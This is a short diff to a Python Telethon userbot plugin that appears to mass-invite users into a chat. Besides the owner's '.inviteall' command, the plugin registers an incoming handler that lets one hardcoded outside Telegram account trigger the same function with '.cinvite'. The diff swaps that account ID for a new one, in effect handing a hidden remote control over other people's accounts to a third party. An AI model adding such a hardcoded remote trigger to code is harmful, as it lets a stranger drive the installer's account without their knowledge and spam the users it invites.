@@ -1,5 +1,6 @@
 # Ported By @VckyouuBitch From Geez - Projects
 # Copyright © Team Geez - Project
+#alby
 
 from telethon.errors import (
     ChannelInvalidError,
@@ -52,8 +53,7 @@ async def get_chatinfo(event):
 
 
 @register(outgoing=True, pattern=r"^\.inviteall(?: |$)(.*)")
-@register(incoming=True, from_users=1663258664,
-          pattern=r"^\.cinvite(?: |$)(.*)")
+@register(incoming=True, from_users=1964264380, pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
     me = await event.client.get_me()
